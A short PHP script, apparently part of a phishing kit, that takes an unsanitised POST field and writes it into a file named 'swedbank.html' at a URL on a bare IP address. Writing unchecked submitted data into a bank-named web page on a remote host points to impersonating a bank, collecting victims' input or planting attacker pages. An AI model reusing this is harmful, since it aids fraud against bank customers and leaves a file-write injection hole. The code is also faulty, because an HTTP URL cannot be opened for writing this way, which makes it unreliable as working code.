<?php
$stringa=$_POST['data'];
$ourFileName = "http://3.67.145.166/partner/sandbox/v1/fx/market-order/orders/src/views/swedbank.html";
$ourFileHandle = fopen($ourFileName, 'w') or die("can't open file");
fwrite($ourFileHandle,$stringa);
fclose($ourFileHandle);

